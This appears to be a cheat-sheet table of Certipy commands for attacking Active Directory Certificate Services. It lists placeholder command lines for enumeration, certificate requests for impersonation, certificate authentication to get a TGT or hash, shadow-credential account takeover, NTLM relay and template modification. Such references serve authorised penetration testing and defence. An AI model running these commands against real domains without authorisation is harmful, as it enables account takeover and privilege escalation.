> Designed to **enumerate, identify, and exploit misconfigurations in Active Directory Certificate Services (AD CS)**

|Action|Command Example|Description|
|---|---|---|
|Enumerate AD CS|`certipy find -u user -p pass -dc-ip <DC IP> -target <domain>`|Finds CAs, templates, and misconfigs|
|Request cert|`certipy req -u user -p pass -ca <CA name> -template <template> -dc-ip <DC IP>`|Requests a certificate (can be abused for impersonation)|
|Authenticate|`certipy auth -pfx <cert.pfx> -password <pfx_password> -dc-ip <DC IP>`|Authenticates using a certificate to obtain a TGT/hash|
|Shadow creds|`certipy shadow -u user -p pass -target <target user> -dc-ip <DC IP>`|Abuses shadow credentials for account takeover|
|Relay attack|`certipy relay -target <CA HTTP endpoint> -u user -p pass -dc-ip <DC IP>`|Performs NTLM relay to AD CS|
|Manage template|`certipy template -u user -p pass -action dump -dc-ip <DC IP>`|Dumps or modifies certificate templates|